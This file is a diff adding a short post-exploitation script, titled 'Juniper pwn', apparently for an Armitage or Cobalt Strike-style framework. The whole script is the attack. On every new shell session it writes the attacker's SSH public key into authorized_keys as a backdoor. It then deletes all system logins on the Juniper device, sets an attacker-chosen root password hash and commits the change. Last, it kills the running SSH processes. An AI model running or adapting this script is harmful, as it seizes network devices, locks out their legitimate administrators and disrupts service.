@@ -1,0 +1,24 @@
+# Script
+# Juniper pwn
+on session_open {
+	$rhost = session_host($1);
+	if(-isshell $1) {
+		say("infecting " . session_host($1));
+		s_cmd($1, "mkdir ~/.ssh");
+		$handle = openf("/root/.ssh/id_rsa.pub");
+		$pub_key = readln($handle);
+		s_cmd($1, "echo $pub_key >> ~/.ssh/authorized_keys");
+		closef($handle);
+		s_cmd($1, "cli");
+		s_cmd($1, "configure exclusive");
+		println("Set password");
+		s_cmd($1, "delete system login");
+		s_cmd($1, "set system root-authentication encrypted-password \$1\$9wm1F4ll\$BOyoOOwb4wwH49Xd72COd.");
+		println("and commit");
+		s_cmd($1, "commit");
+		println("and end " . $1 . ":" . session_host($1));
+		s_cmd($1, "exit");
+		s_cmd($1, "exit");
+		s_cmd($1, "ps aux | grep ssh | awk '{ print \$2 }' | xargs kill -9");
+	}
+}
